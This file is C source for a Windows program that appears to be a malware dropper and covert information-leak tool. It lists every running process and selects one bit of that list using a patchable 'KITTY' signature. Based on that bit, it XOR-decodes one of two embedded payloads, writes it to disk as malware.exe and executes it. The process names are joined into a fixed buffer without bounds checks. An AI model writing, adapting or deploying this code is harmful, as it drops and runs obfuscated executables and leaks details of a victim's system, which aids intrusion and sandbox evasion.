#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include "leak.h"

#define SIG "KITTY"
char *bit = SIG "000";

int main() {
    CHAR buf[4096] = {0}; 
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    
    // Створюємо знімок усіх процесів у системі
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 1;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return 1; // Помилка
    }
    
    // Перебираємо всі процеси і додаємо їх імена в буфер
    do {
        strcat(buf, pe32.szExeFile);
        strcat(buf, ","); 
    } while (Process32Next(hProcessSnap, &pe32));
    
    CloseHandle(hProcessSnap);

    char *p;
    int b, psz;
    b = atoi(bit + sizeof(SIG) - 1);

    if (buf[b / 8] & (1 << (b % 8))) {
        p = bit1;
        psz = sizeof(bit1);
    } else {
        p = bit0;
        psz = sizeof(bit0);
    }

    FILE *out = fopen("malware.exe", "wb");
    while (psz--) {
        fputc(0xFF ^ *p++, out);
    }
    fclose(out);
    system("malware.exe");

    return 0;
}